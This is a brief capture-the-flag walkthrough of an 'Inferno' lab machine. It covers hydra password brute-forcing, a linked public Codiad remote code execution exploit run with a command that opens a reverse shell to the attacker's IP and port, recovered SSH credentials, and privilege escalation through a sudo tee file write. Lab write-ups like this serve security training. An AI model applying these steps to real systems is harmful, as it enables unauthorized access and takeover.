Enumeration:
A lot of ports, but useful 22,80, others seem to be decoys
![image](https://github.com/user-attachments/assets/d56e2229-a13f-4eef-9b4d-530830418ad4)

Nikto didnt give useful info on server, source code too.
Running gobuster -> found /inferno directory. 
Bruteforcing with hydra -> admin:dante1 creds.

Foothold:
We see a codiad login page -> same creds work, we are logged in.
CVE for codiad page -> https://github.com/WangYihang/Codiad-Remote-Code-Execute-Exploit?tab=readme-ov-file
Copy the code and run the python script: python3 rce.py http://admin:dante1@[VM IP]/inferno/ admin dante1 [YOUR IP] [YOUR PORT] linux
Session dies after a minute or so, I had to look for hints in walkthroughs, but stabilization is useless here. 
Found dat file in Downloads, copy contents and decipher for a password for ssh :)
![image](https://github.com/user-attachments/assets/dc8138cd-02ca-4357-ab71-aa6a473326e4)

Using dcode site: ![image](https://github.com/user-attachments/assets/c49a3fed-4a4b-4d2f-a3b6-6491c26d75f5)
Creds for ssh - > dante:V1rg1l10h3lpm3
Found local.txt once connected.

Privesc:

This session dies fast too, use /bin/sh stabilises
running sudo -l we see we can run tee -> use file write to switch to inferno user
![image](https://github.com/user-attachments/assets/569f8bb7-0cb2-4c83-b3cc-d9a2381a2295)

Flag is in root/proof.txt





